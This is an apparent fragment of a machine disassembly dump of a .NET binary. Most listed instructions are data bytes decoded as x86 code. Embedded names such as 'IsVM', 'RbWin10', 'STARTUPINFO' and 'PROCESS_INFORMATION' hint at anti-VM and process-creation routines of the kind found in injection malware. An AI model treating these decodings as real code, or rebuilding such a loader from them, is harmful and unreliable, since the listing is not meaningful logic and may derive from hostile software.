  40433c:	1a 0d 22 00 e9 00    	sbb    0xe90022,%cl
  404342:	1a 0d 06 00 21 01    	sbb    0x1210006,%cl
  404348:	1a 0d 06 00 29 01    	sbb    0x1290006,%cl
  40434e:	1a 0d 28 00 31 01    	sbb    0x1310028,%cl
  404354:	1a 0d 06 00 41 01    	sbb    0x1410006,%cl
  40435a:	43                   	inc    %ebx
  40435b:	10 2e                	adc    %ch,(%esi)
  40435d:	00 91 01 1a 0d 34    	add    %dl,0x340d1a01(%ecx)
  404363:	00 b1 01 03 10 52    	add    %dh,0x52100301(%ecx)
  404369:	00 91 00 f6 03 59    	add    %dl,0x5903f600(%ecx)
  40436f:	00 91 00 34 12 5f    	add    %dl,0x5f123400(%ecx)
  404375:	00 b9 01 3d 02 67    	add    %bh,0x67023d01(%ecx)
  40437b:	00 91 00 01 03 6f    	add    %dl,0x6f030100(%ecx)
  404381:	00 c9                	add    %cl,%cl
  404383:	01 6e 04             	add    %ebp,0x4(%esi)
  404386:	77 00                	ja     0x404388
  404388:	d9 01                	flds   (%ecx)
  40438a:	00 0c 81             	add    %cl,(%ecx,%eax,4)
  40438d:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404390:	6e                   	outsb  %ds:(%esi),(%dx)
  404391:	04 ab                	add    $0xab,%al
  404393:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404396:	6f                   	outsl  %ds:(%esi),(%dx)
  404397:	10 b7 00 14 00 b6    	adc    %dh,-0x49ffec00(%edi)
  40439d:	02 c6                	add    %dh,%al
  40439f:	00 d9                	add    %bl,%cl
  4043a1:	01 33                	add    %esi,(%ebx)
  4043a3:	11 cf                	adc    %ecx,%edi
  4043a5:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4043a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4043a9:	04 ab                	add    $0xab,%al
  4043ab:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4043ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4043af:	10 b7 00 24 00 b6    	adc    %dh,-0x49ffdc00(%edi)
  4043b5:	02 c6                	add    %dh,%al
  4043b7:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4043ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4043bb:	04 ab                	add    $0xab,%al
  4043bd:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4043c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4043c1:	10 b7 00 34 00 b6    	adc    %dh,-0x49ffcc00(%edi)
  4043c7:	02 c6                	add    %dh,%al
  4043c9:	00 11                	add    %dl,(%ecx)
  4043cb:	01 02                	add    %eax,(%edx)
  4043cd:	0d 16 01 a1 00       	or     $0xa10116,%eax
  4043d2:	15 11 1b 01 3c       	adc    $0x3c011b11,%eax
  4043d7:	00 6e 04             	add    %ch,0x4(%esi)
  4043da:	ab                   	stos   %eax,%es:(%edi)
  4043db:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4043de:	6f                   	outsl  %ds:(%esi),(%dx)
  4043df:	10 b7 00 d9 01 b1    	adc    %dh,-0x4efe2700(%edi)
  4043e5:	11 2e                	adc    %ebp,(%esi)
  4043e7:	01 44 00 6e          	add    %eax,0x6e(%eax,%eax,1)
  4043eb:	04 ab                	add    $0xab,%al
  4043ed:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  4043f1:	10 b7 00 4c 00 b6    	adc    %dh,-0x49ffb400(%edi)
  4043f7:	02 5b 01             	add    0x1(%ebx),%bl
  4043fa:	54                   	push   %esp
  4043fb:	00 b6 02 c6 00 b1    	add    %dh,-0x4eff39fe(%esi)
  404401:	01 79 0f             	add    %edi,0xf(%ecx)
  404404:	71 01                	jno    0x404407
  404406:	a1 00 50 11 76       	mov    0x76115000,%eax
  40440b:	01 99 00 66 04 06    	add    %ebx,0x6046600(%ecx)
  404411:	00 f9                	add    %bh,%cl
  404413:	01 96 01 82 01 01    	add    %edx,0x1018201(%esi)
  404419:	02 c6                	add    %dh,%al
  40441b:	0b 86 01 01 02 40    	or     0x40020101(%esi),%eax
  404421:	12 89 01 09 02 c1    	adc    -0x3efdf6ff(%ecx),%cl
  404427:	0c 8f                	or     $0x8f,%al
  404429:	01 19                	add    %ebx,(%ecx)
  40442b:	02 89 10 98 01 21    	add    0x21019810(%ecx),%cl
  404431:	02 e9                	add    %cl,%ch
  404433:	08 a3 01 31 02 b8    	or     %ah,-0x47fdceff(%ebx)
  404439:	00 a9 01 31 02 03    	add    %ch,0x3023101(%ecx)
  40443f:	09 af 01 39 02 53    	or     %ebp,0x53023901(%edi)
  404445:	00 b5 01 01 02 34    	add    %dh,0x34020101(%ebp)
  40444b:	12 89 01 09 02 ae    	adc    -0x51fdf6ff(%ecx),%cl
  404451:	08 c8                	or     %cl,%al
  404453:	01 01                	add    %eax,(%ecx)
  404455:	02 7d 10             	add    0x10(%ebp),%bh
  404458:	e8 01 a9 00 01       	call   0x140ed5e
  40445d:	02 25 02 a9 00 fa    	add    0xfa00a902,%ah
  404463:	08 2a                	or     %ch,(%edx)
  404465:	02 b1 01 0d 09 2f    	add    0x2f090d01(%ecx),%dh
  40446b:	02 31                	add    (%ecx),%dh
  40446d:	02 7f 02             	add    0x2(%edi),%bh
  404470:	a9 01 31 02 cd       	test   $0xcd023101,%eax
  404475:	0e                   	push   %cs
  404476:	35 02 41 02 03       	xor    $0x3024102,%eax
  40447b:	12 3b                	adc    (%ebx),%bh
  40447d:	02 09                	add    (%ecx),%cl
  40447f:	02 d8                	add    %al,%bl
  404481:	09 e8                	or     %ebp,%eax
  404483:	01 09                	add    %ecx,(%ecx)
  404485:	02 10                	add    (%eax),%dl
  404487:	12 48 02             	adc    0x2(%eax),%cl
  40448a:	b1 01                	mov    $0x1,%cl
  40448c:	03 10                	add    (%eax),%edx
  40448e:	51                   	push   %ecx
  40448f:	02 09                	add    (%ecx),%cl
  404491:	02 e5                	add    %ch,%ah
  404493:	09 57 02             	or     %edx,0x2(%edi)
  404496:	51                   	push   %ecx
  404497:	02 94 0a 60 02 59 02 	add    0x2590260(%edx,%ecx,1),%dl
  40449e:	b5 03                	mov    $0x3,%ch
  4044a0:	65 02 61 02          	add    %gs:0x2(%ecx),%ah
  4044a4:	7d 10                	jge    0x4044b6
  4044a6:	8c 02                	mov    %es,(%edx)
  4044a8:	19 02                	sbb    %eax,(%edx)
  4044aa:	27                   	daa
  4044ab:	09 91 02 51 02 d6    	or     %edx,-0x29fdaefe(%ecx)
  4044b1:	03 51 02             	add    0x2(%ecx),%edx
  4044b4:	b1 01                	mov    $0x1,%cl
  4044b6:	22 02                	and    (%edx),%al
  4044b8:	98                   	cwtl
  4044b9:	02 71 02             	add    0x2(%ecx),%dh
  4044bc:	ed                   	in     (%dx),%eax
  4044bd:	0f 9e 02             	setle  (%edx)
  4044c0:	79 02                	jns    0x4044c4
  4044c2:	1a 0d 06 00 79 02    	sbb    0x2790006,%cl
  4044c8:	54                   	push   %esp
  4044c9:	11 a3 02 81 01 1a    	adc    %esp,0x1a018102(%ebx)
  4044cf:	0d a9 02 19 01       	or     $0x11902a9,%eax
  4044d4:	5c                   	pop    %esp
  4044d5:	09 b1 02 19 01 84    	or     %esi,-0x7bfee6fe(%ecx)
  4044db:	0b b8 02 19 01 1a    	or     0x1a011902(%eax),%edi
  4044e1:	0d 06 00 39 01       	or     $0x1390006,%eax
  4044e6:	1a 0d 06 00 89 02    	sbb    0x2890006,%cl
  4044ec:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4044ed:	01 cd                	add    %ecx,%ebp
  4044ef:	02 5c 00 9a          	add    -0x66(%eax,%eax,1),%bl
  4044f3:	10 dd                	adc    %bl,%ch
  4044f5:	02 91 02 38 0a 1b    	add    0x1b0a3802(%ecx),%dl
  4044fb:	01 a1 02 21 11 1b    	add    %esp,0x1b112102(%ecx)
  404501:	01 89 00 fa 08 e2    	add    %ecx,-0x1df70600(%ecx)
  404507:	02 b1 01 03 10 e6    	add    -0x19effcff(%ecx),%dh
  40450d:	02 61 01             	add    0x1(%ecx),%ah
  404510:	6e                   	outsb  %ds:(%esi),(%dx)
  404511:	11 10                	adc    %edx,(%eax)
  404513:	00 a9 02 b3 01 15    	add    %ch,0x1501b302(%ecx)
  404519:	00 79 01             	add    %bh,0x1(%ecx)
  40451c:	9b                   	fwait
  40451d:	02 e2                	add    %dl,%ah
  40451f:	02 b1 02 a1 11 ec    	add    -0x13ee5efe(%ecx),%dh
  404525:	02 61 01             	add    0x1(%ecx),%ah
  404528:	65 11 e2             	gs adc %esp,%edx
  40452b:	02 b1 01 2a 02 9e    	add    -0x61fdd5ff(%ecx),%dh
  404531:	02 d1                	add    %cl,%dl
  404533:	02 77 11             	add    0x11(%edi),%dh
  404536:	fa                   	cli
  404537:	02 d9                	add    %cl,%bl
  404539:	02 1a                	add    (%edx),%bl
  40453b:	0d 06 00 d9 02       	or     $0x2d90006,%eax
  404540:	4a                   	dec    %edx
  404541:	03 10                	add    (%eax),%edx
  404543:	00 d9                	add    %bl,%cl
  404545:	02 f9                	add    %cl,%bh
  404547:	07                   	pop    %es
  404548:	15 00 59 02 2d       	adc    $0x2d025900,%eax
  40454d:	11 ff                	adc    %edi,%edi
  40454f:	02 19                	add    (%ecx),%bl
  404551:	01 f3                	add    %esi,%ebx
  404553:	10 0e                	adc    %cl,(%esi)
  404555:	03 e1                	add    %ecx,%esp
  404557:	02 1a                	add    (%edx),%bl
  404559:	0d 16 03 e9 02       	or     $0x2e90316,%eax
  40455e:	82 09 1c             	orb    $0x1c,(%ecx)
  404561:	03 89 00 1a 0d 06    	add    0x60d1a00(%ecx),%ecx
  404567:	00 91 00 f6 11 23    	add    %dl,0x2311f600(%ecx)
  40456d:	03 99 01 1a 0d 29    	add    0x290d1a01(%ecx),%ebx
  404573:	03 a9 01 1a 0d 06    	add    0x60d1a01(%ecx),%ebp
  404579:	00 f9                	add    %bh,%cl
  40457b:	02 f4                	add    %ah,%dh
  40457d:	01 31                	add    %esi,(%ecx)
  40457f:	03 29                	add    (%ecx),%ebp
  404581:	00 ab 00 a6 05 2e    	add    %ch,0x2e05a600(%ebx)
  404587:	00 0b                	add    %cl,(%ebx)
  404589:	00 7e 05             	add    %bh,0x5(%esi)
  40458c:	2e 00 13             	add    %dl,%cs:(%ebx)
  40458f:	00 87 05 2e 00 1b    	add    %al,0x1b002e05(%edi)
  404595:	00 a6 05 2e 00 23    	add    %ah,0x23002e05(%esi)
  40459b:	00 af 05 2e 00 2b    	add    %ch,0x2b002e05(%edi)
  4045a1:	00 cf                	add    %cl,%bh
  4045a3:	05 2e 00 33 00       	add    $0x33002e,%eax
  4045a8:	cf                   	iret
  4045a9:	05 2e 00 3b 00       	add    $0x3b002e,%eax
  4045ae:	cf                   	iret
  4045af:	05 2e 00 43 00       	add    $0x43002e,%eax
  4045b4:	af                   	scas   %es:(%edi),%eax
  4045b5:	05 2e 00 4b 00       	add    $0x4b002e,%eax
  4045ba:	d5 05                	aad    $0x5
  4045bc:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  4045c0:	cf                   	iret
  4045c1:	05 2e 00 5b 00       	add    $0x5b002e,%eax
  4045c6:	cf                   	iret
  4045c7:	05 2e 00 63 00       	add    $0x63002e,%eax
  4045cc:	ed                   	in     (%dx),%eax
  4045cd:	05 2e 00 6b 00       	add    $0x6b002e,%eax
  4045d2:	fa                   	cli
  4045d3:	05 2e 00 73 00       	add    $0x73002e,%eax
  4045d8:	07                   	pop    %es
  4045d9:	06                   	push   %es
  4045da:	49                   	dec    %ecx
  4045db:	00 ab 00 a6 05 a3    	add    %ch,-0x5cfa5a00(%ebx)
  4045e1:	00 93 00 83 06 a3    	add    %dl,-0x5cf97d00(%ebx)
  4045e7:	00 8b 00 51 06 a3    	add    %cl,-0x5cf9af00(%ebx)
  4045ed:	00 83 00 51 06 c3    	add    %al,-0x3cf9af00(%ebx)
  4045f3:	00 83 00 51 06 c3    	add    %al,-0x3cf9af00(%ebx)
  4045f9:	00 93 00 c4 06 e3    	add    %dl,-0x1cf93c00(%ebx)
  4045ff:	00 7b 00             	add    %bh,0x0(%ebx)
  404602:	1e                   	push   %ds
  404603:	07                   	pop    %es
  404604:	63 01                	arpl   %eax,(%ecx)
  404606:	7b 00                	jnp    0x404608
  404608:	1e                   	push   %ds
  404609:	07                   	pop    %es
  40460a:	83 01 7b             	addl   $0x7b,(%ecx)
  40460d:	00 1e                	add    %bl,(%esi)
  40460f:	07                   	pop    %es
  404610:	a3 01 7b 00 27       	mov    %eax,0x27007b01
  404615:	07                   	pop    %es
  404616:	c3                   	ret
  404617:	01 7b 00             	add    %edi,0x0(%ebx)
  40461a:	27                   	daa
  40461b:	07                   	pop    %es
  40461c:	e3 01                	jecxz  0x40461f
  40461e:	7b 00                	jnp    0x404620
  404620:	1e                   	push   %ds
  404621:	07                   	pop    %es
  404622:	03 02                	add    (%edx),%eax
  404624:	7b 00                	jnp    0x404626
  404626:	1e                   	push   %ds
  404627:	07                   	pop    %es
  404628:	23 02                	and    (%edx),%eax
  40462a:	7b 00                	jnp    0x40462c
  40462c:	27                   	daa
  40462d:	07                   	pop    %es
  40462e:	43                   	inc    %ebx
  40462f:	02 7b 00             	add    0x0(%ebx),%bh
  404632:	27                   	daa
  404633:	07                   	pop    %es
  404634:	60                   	pusha
  404635:	02 8b 00 51 06 60    	add    0x60065100(%ebx),%cl
  40463b:	02 93 00 56 06 63    	add    0x63065600(%ebx),%dl
  404641:	02 7b 00             	add    0x0(%ebx),%bh
  404644:	27                   	daa
  404645:	07                   	pop    %es
  404646:	80 02 9b             	addb   $0x9b,(%edx)
  404649:	00 51 06             	add    %dl,0x6(%ecx)
  40464c:	80 02 8b             	addb   $0x8b,(%edx)
  40464f:	00 51 06             	add    %dl,0x6(%ecx)
  404652:	80 02 93             	addb   $0x93,(%edx)
  404655:	00 56 06             	add    %dl,0x6(%esi)
  404658:	83 02 7b             	addl   $0x7b,(%edx)
  40465b:	00 1e                	add    %bl,(%esi)
  40465d:	07                   	pop    %es
  40465e:	a3 02 7b 00 27       	mov    %eax,0x27007b02
  404663:	07                   	pop    %es
  404664:	c3                   	ret
  404665:	02 7b 00             	add    0x0(%ebx),%bh
  404668:	1e                   	push   %ds
  404669:	07                   	pop    %es
  40466a:	e3 02                	jecxz  0x40466e
  40466c:	83 00 51             	addl   $0x51,(%eax)
  40466f:	06                   	push   %es
  404670:	40                   	inc    %eax
  404671:	03 8b 00 51 06 40    	add    0x40065100(%ebx),%ecx
  404677:	03 93 00 56 06 60    	add    0x60065600(%ebx),%edx
  40467d:	03 8b 00 51 06 60    	add    0x60065100(%ebx),%ecx
  404683:	03 93 00 56 06 60    	add    0x60065600(%ebx),%edx
  404689:	03 ab 00 7a 06 3b    	add    0x3b067a00(%ebx),%ebp
  40468f:	00 7a 01             	add    %bh,0x1(%edx)
  404692:	9d                   	popf
  404693:	01 bc 01 d4 01 ed 01 	add    %edi,0x1ed01d4(%ecx,%eax,1)
  40469a:	f4                   	hlt
  40469b:	01 fc                	add    %edi,%esp
  40469d:	01 5c 02 6d          	add    %ebx,0x6d(%edx,%eax,1)
  4046a1:	02 bc 02 08 03 05 00 	add    0x50308(%edx,%eax,1),%bh
  4046a8:	01 00                	add    %eax,(%eax)
  4046aa:	06                   	push   %es
  4046ab:	00 03                	add    %al,(%ebx)
  4046ad:	00 00                	add    %al,(%eax)
  4046af:	00 78 0c             	add    %bh,0xc(%eax)
  4046b2:	6d                   	insl   (%dx),%es:(%edi)
  4046b3:	05 00 00 3b 04       	add    $0x43b0000,%eax
  4046b8:	73 05                	jae    0x4046bf
  4046ba:	00 00                	add    %al,(%eax)
  4046bc:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4046bd:	10 79 05             	adc    %bh,0x5(%ecx)
  4046c0:	02 00                	add    (%eax),%al
  4046c2:	1d 00 03 00 02       	sbb    $0x2000300,%eax
  4046c7:	00 1e                	add    %bl,(%esi)
  4046c9:	00 05 00 01 00 1f    	add    %al,0x1f000100
  4046cf:	00 05 00 02 00 20    	add    %al,0x20000200
  4046d5:	00 07                	add    %al,(%edi)
  4046d7:	00 04 00             	add    %al,(%eax,%eax,1)
  4046da:	36 00 29             	add    %ch,%ss:(%ecx)
  4046dd:	00 4a 00             	add    %cl,0x0(%edx)
  4046e0:	9c                   	pushf
  4046e1:	00 bb 00 dc 00 ec    	add    %bh,-0x13ff2400(%ebx)
  4046e7:	00 f8                	add    %bh,%al
  4046e9:	00 09                	add    %cl,(%ecx)
  4046eb:	01 1f                	add    %ebx,(%edi)
  4046ed:	01 41 01             	add    %eax,0x1(%ecx)
  4046f0:	50                   	push   %eax
  4046f1:	01 66 01             	add    %esp,0x1(%esi)
  4046f4:	d6                   	salc
  4046f5:	02 00                	add    (%eax),%al
  4046f7:	01 0f                	add    %ecx,(%edi)
  4046f9:	00 d4                	add    %dl,%ah
  4046fb:	0f 01 00             	sgdtl  (%eax)
  4046fe:	00 01                	add    %al,(%ecx)
  404700:	11 00                	adc    %eax,(%eax)
  404702:	df 02                	filds  (%edx)
  404704:	01 00                	add    %eax,(%eax)
  404706:	00 01                	add    %al,(%ecx)
  404708:	13 00                	adc    (%eax),%eax
  40470a:	15 12 01 00 04       	adc    $0x4000112,%eax
  40470f:	80 00 00             	addb   $0x0,(%eax)
  404712:	01 00                	add    %eax,(%eax)
	...
  404720:	0d 0c 00 00 04       	or     $0x400000c,%eax
	...
  40472d:	00 00                	add    %al,(%eax)
  40472f:	00 3a                	add    %bh,(%edx)
  404731:	03 37                	add    (%edi),%esi
  404733:	01 00                	add    %eax,(%eax)
  404735:	00 00                	add    %al,(%eax)
  404737:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  404742:	00 00                	add    %al,(%eax)
  404744:	43                   	inc    %ebx
  404745:	03 c2                	add    %edx,%eax
  404747:	09 00                	or     %eax,(%eax)
  404749:	00 00                	add    %al,(%eax)
  40474b:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  404756:	00 00                	add    %al,(%eax)
  404758:	3a 03                	cmp    (%ebx),%al
  40475a:	fe 03                	incb   (%ebx)
  40475c:	00 00                	add    %al,(%eax)
  40475e:	00 00                	add    %al,(%eax)
  404760:	04 00                	add    $0x0,%al
	...
  40476a:	00 00                	add    %al,(%eax)
  40476c:	3a 03                	cmp    (%ebx),%al
  40476e:	56                   	push   %esi
  40476f:	0a 00                	or     (%eax),%al
  404771:	00 00                	add    %al,(%eax)
  404773:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40477e:	00 00                	add    %al,(%eax)
  404780:	3a 03                	cmp    (%ebx),%al
  404782:	1d 0a 00 00 00       	sbb    $0xa,%eax
  404787:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  404792:	00 00                	add    %al,(%eax)
  404794:	43                   	inc    %ebx
  404795:	03 0a                	add    (%edx),%ecx
  404797:	04 00                	add    $0x0,%al
  404799:	00 00                	add    %al,(%eax)
  40479b:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4047a6:	00 00                	add    %al,(%eax)
  4047a8:	4c                   	dec    %esp
  4047a9:	03 d9                	add    %ecx,%ebx
  4047ab:	0b 00                	or     (%eax),%eax
  4047ad:	00 00                	add    %al,(%eax)
  4047af:	00 00                	add    %al,(%eax)
  4047b1:	00 00                	add    %al,(%eax)
  4047b3:	00 01                	add    %al,(%ecx)
  4047b5:	00 00                	add    %al,(%eax)
  4047b7:	00 ba 0d 00 00 20    	add    %bh,0x2000000d(%edx)
  4047bd:	31 00                	xor    %eax,(%eax)
  4047bf:	00 01                	add    %al,(%ecx)
  4047c1:	00 00                	add    %al,(%eax)
  4047c3:	00 e1                	add    %ah,%cl
  4047c5:	0d 00 00 07 00       	or     $0x70000,%eax
  4047ca:	02 00                	add    (%eax),%al
  4047cc:	08 00                	or     %al,(%eax)
  4047ce:	02 00                	add    (%eax),%al
  4047d0:	09 00                	or     %eax,(%eax)
  4047d2:	02 00                	add    (%eax),%al
  4047d4:	0a 00                	or     (%eax),%al
  4047d6:	02 00                	add    (%eax),%al
  4047d8:	0b 00                	or     (%eax),%eax
  4047da:	02 00                	add    (%eax),%al
  4047dc:	0c 00                	or     $0x0,%al
  4047de:	02 00                	add    (%eax),%al
  4047e0:	0d 00 02 00 0e       	or     $0xe000200,%eax
  4047e5:	00 02                	add    %al,(%edx)
  4047e7:	00 0f                	add    %cl,(%edi)
  4047e9:	00 02                	add    %al,(%edx)
  4047eb:	00 10                	add    %dl,(%eax)
  4047ed:	00 02                	add    %al,(%edx)
  4047ef:	00 11                	add    %dl,(%ecx)
  4047f1:	00 02                	add    %al,(%edx)
  4047f3:	00 12                	add    %dl,(%edx)
  4047f5:	00 02                	add    %al,(%edx)
  4047f7:	00 13                	add    %dl,(%ebx)
  4047f9:	00 02                	add    %al,(%edx)
  4047fb:	00 14 00             	add    %dl,(%eax,%eax,1)
  4047fe:	02 00                	add    (%eax),%al
  404800:	15 00 02 00 16       	adc    $0x16000200,%eax
  404805:	00 02                	add    %al,(%edx)
  404807:	00 17                	add    %dl,(%edi)
  404809:	00 02                	add    %al,(%edx)
  40480b:	00 7b 00             	add    %bh,0x0(%ebx)
  40480e:	cf                   	iret
  40480f:	01 00                	add    %eax,(%eax)
  404811:	00 00                	add    %al,(%eax)
  404813:	00 00                	add    %al,(%eax)
  404815:	3c 3e                	cmp    $0x3e,%al
  404817:	70 5f                	jo     0x404878
  404819:	5f                   	pop    %edi
  40481a:	31 30                	xor    %esi,(%eax)
  40481c:	00 52 62             	add    %dl,0x62(%edx)
  40481f:	57                   	push   %edi
  404820:	69 6e 31 30 00 3c 3e 	imul   $0x3e3c0030,0x31(%esi),%ebp
  404827:	70 5f                	jo     0x404888
  404829:	5f                   	pop    %edi
  40482a:	30 00                	xor    %al,(%eax)
  40482c:	3c 3e                	cmp    $0x3e,%al
  40482e:	6f                   	outsl  %ds:(%esi),(%dx)
  40482f:	5f                   	pop    %edi
  404830:	5f                   	pop    %edi
  404831:	31 00                	xor    %eax,(%eax)
  404833:	3c 3e                	cmp    $0x3e,%al
  404835:	70 5f                	jo     0x404896
  404837:	5f                   	pop    %edi
  404838:	31 00                	xor    %eax,(%eax)
  40483a:	4e                   	dec    %esi
  40483b:	75 6c                	jne    0x4048a9
  40483d:	6c                   	insb   (%dx),%es:(%edi)
  40483e:	61                   	popa
  40483f:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  404843:	31 00                	xor    %eax,(%eax)
  404845:	49                   	dec    %ecx
  404846:	45                   	inc    %ebp
  404847:	6e                   	outsb  %ds:(%esi),(%dx)
  404848:	75 6d                	jne    0x4048b7
  40484a:	65 72 61             	gs jb  0x4048ae
  40484d:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  404851:	31 00                	xor    %eax,(%eax)
  404853:	43                   	inc    %ebx
  404854:	61                   	popa
  404855:	6c                   	insb   (%dx),%es:(%edi)
  404856:	6c                   	insb   (%dx),%es:(%edi)
  404857:	53                   	push   %ebx
  404858:	69 74 65 60 31 00 6b 	imul   $0x656b0031,0x60(%ebp,%eiz,2),%esi
  40485f:	65 
  404860:	72 6e                	jb     0x4048d0
  404862:	65 6c                	gs insb (%dx),%es:(%edi)
  404864:	33 32                	xor    (%edx),%esi
  404866:	00 54 6f 55          	add    %dl,0x55(%edi,%ebp,2)
  40486a:	49                   	dec    %ecx
  40486b:	6e                   	outsb  %ds:(%esi),(%dx)
  40486c:	74 33                	je     0x4048a1
  40486e:	32 00                	xor    (%eax),%al
  404870:	58                   	pop    %eax
  404871:	75 33                	jne    0x4048a6
  404873:	32 00                	xor    (%eax),%al
  404875:	3c 3e                	cmp    $0x3e,%al
  404877:	70 5f                	jo     0x4048d8
  404879:	5f                   	pop    %edi
  40487a:	32 00                	xor    (%eax),%al
  40487c:	63 62 52             	arpl   %esp,0x52(%edx)
  40487f:	65 73 65             	gs jae 0x4048e7
  404882:	72 76                	jb     0x4048fa
  404884:	65 64 32 00          	gs xor %fs:(%eax),%al
  404888:	6c                   	insb   (%dx),%es:(%edi)
  404889:	70 52                	jo     0x4048dd
  40488b:	65 73 65             	gs jae 0x4048f3
  40488e:	72 76                	jb     0x404906
  404890:	65 64 32 00          	gs xor %fs:(%eax),%al
  404894:	3c 3e                	cmp    $0x3e,%al
  404896:	70 5f                	jo     0x4048f7
  404898:	5f                   	pop    %edi
  404899:	33 00                	xor    (%eax),%eax
  40489b:	46                   	inc    %esi
  40489c:	75 6e                	jne    0x40490c
  40489e:	63 60 33             	arpl   %esp,0x33(%eax)
  4048a1:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  4048a4:	70 5f                	jo     0x404905
  4048a6:	5f                   	pop    %edi
  4048a7:	34 00                	xor    $0x0,%al
  4048a9:	46                   	inc    %esi
  4048aa:	75 6e                	jne    0x40491a
  4048ac:	63 60 34             	arpl   %esp,0x34(%eax)
  4048af:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  4048b2:	70 5f                	jo     0x404913
  4048b4:	5f                   	pop    %edi
  4048b5:	35 00 3c 3e 70       	xor    $0x703e3c00,%eax
  4048ba:	5f                   	pop    %edi
  4048bb:	5f                   	pop    %edi
  4048bc:	36 00 3c 3e          	add    %bh,%ss:(%esi,%edi,1)
  4048c0:	70 5f                	jo     0x404921
  4048c2:	5f                   	pop    %edi
  4048c3:	37                   	aaa
  4048c4:	00 52 62             	add    %dl,0x62(%edx)
  4048c7:	57                   	push   %edi
  4048c8:	69 6e 37 00 67 65 74 	imul   $0x74656700,0x37(%esi),%ebp
  4048cf:	5f                   	pop    %edi
  4048d0:	55                   	push   %ebp
  4048d1:	54                   	push   %esp
  4048d2:	46                   	inc    %esi
  4048d3:	38 00                	cmp    %al,(%eax)
  4048d5:	3c 3e                	cmp    $0x3e,%al
  4048d7:	70 5f                	jo     0x404938
  4048d9:	5f                   	pop    %edi
  4048da:	38 00                	cmp    %al,(%eax)
  4048dc:	52                   	push   %edx
  4048dd:	62 57 69             	bound  %edx,0x69(%edi)
  4048e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4048e1:	38 00                	cmp    %al,(%eax)
  4048e3:	3c 3e                	cmp    $0x3e,%al
  4048e5:	70 5f                	jo     0x404946
  4048e7:	5f                   	pop    %edi
  4048e8:	39 00                	cmp    %eax,(%eax)
  4048ea:	3c 4d                	cmp    $0x4d,%al
  4048ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4048ed:	64 75 6c             	fs jne 0x40495c
  4048f0:	65 3e 00 55 4e       	gs add %dl,%ds:0x4e(%ebp)
  4048f5:	49                   	dec    %ecx
  4048f6:	43                   	inc    %ebx
  4048f7:	4f                   	dec    %edi
  4048f8:	44                   	inc    %esp
  4048f9:	45                   	inc    %ebp
  4048fa:	5f                   	pop    %edi
  4048fb:	53                   	push   %ebx
  4048fc:	54                   	push   %esp
  4048fd:	52                   	push   %edx
  4048fe:	49                   	dec    %ecx
  4048ff:	4e                   	dec    %esi
  404900:	47                   	inc    %edi
  404901:	00 49 73             	add    %cl,0x73(%ecx)
  404904:	56                   	push   %esi
  404905:	4d                   	dec    %ebp
  404906:	00 50 52             	add    %dl,0x52(%eax)
  404909:	4f                   	dec    %edi
  40490a:	43                   	inc    %ebx
  40490b:	45                   	inc    %ebp
  40490c:	53                   	push   %ebx
  40490d:	53                   	push   %ebx
  40490e:	5f                   	pop    %edi
  40490f:	49                   	dec    %ecx
  404910:	4e                   	dec    %esi
  404911:	46                   	inc    %esi
  404912:	4f                   	dec    %edi
  404913:	52                   	push   %edx
  404914:	4d                   	dec    %ebp
  404915:	41                   	inc    %ecx
  404916:	54                   	push   %esp
  404917:	49                   	dec    %ecx
  404918:	4f                   	dec    %edi
  404919:	4e                   	dec    %esi
  40491a:	00 53 54             	add    %dl,0x54(%ebx)
  40491d:	41                   	inc    %ecx
  40491e:	52                   	push   %edx
  40491f:	54                   	push   %esp
  404920:	55                   	push   %ebp
  404921:	50                   	push   %eax
  404922:	49                   	dec    %ecx
  404923:	4e                   	dec    %esi
  404924:	46                   	inc    %esi
  404925:	4f                   	dec    %edi
  404926:	00 53 79             	add    %dl,0x79(%ebx)
  404929:	73 74                	jae    0x40499f
  40492b:	65 6d                	gs insl (%dx),%es:(%edi)
  40492d:	2e 49                	cs dec %ecx
  40492f:	4f                   	dec    %edi
  404930:	00 57 00             	add    %dl,0x0(%edi)
  404933:	64 77 58             	fs ja  0x40498e
  404936:	00 64 77 59          	add    %ah,0x59(%edi,%esi,2)
  40493a:	00 44 61 74          	add    %al,0x74(%ecx,%eiz,2)
  40493e:	61                   	popa
  40493f:	00 64 61 74          	add    %ah,0x74(%ecx,%eiz,2)
  404943:	61                   	popa
  404944:	00 58 62             	add    %bl,0x62(%eax)
  404947:	00 63 62             	add    %ah,0x62(%ebx)
  40494a:	00 6d 73             	add    %ch,0x73(%ebp)
  40494d:	63 6f 72             	arpl   %ebp,0x72(%edi)
  404950:	6c                   	insb   (%dx),%es:(%edi)
  404951:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  404958:	65 6d                	gs insl (%dx),%es:(%edi)
  40495a:	2e 43                	cs inc %ebx
  40495c:	6f                   	outsl  %ds:(%esi),(%dx)
  40495d:	6c                   	insb   (%dx),%es:(%edi)
  40495e:	6c                   	insb   (%dx),%es:(%edi)
  40495f:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  404964:	6e                   	outsb  %ds:(%esi),(%dx)
  404965:	73 2e                	jae    0x404995
  404967:	47                   	inc    %edi
  404968:	65 6e                	outsb  %gs:(%esi),(%dx)
  40496a:	65 72 69             	gs jb  0x4049d6
  40496d:	63 00                	arpl   %eax,(%eax)
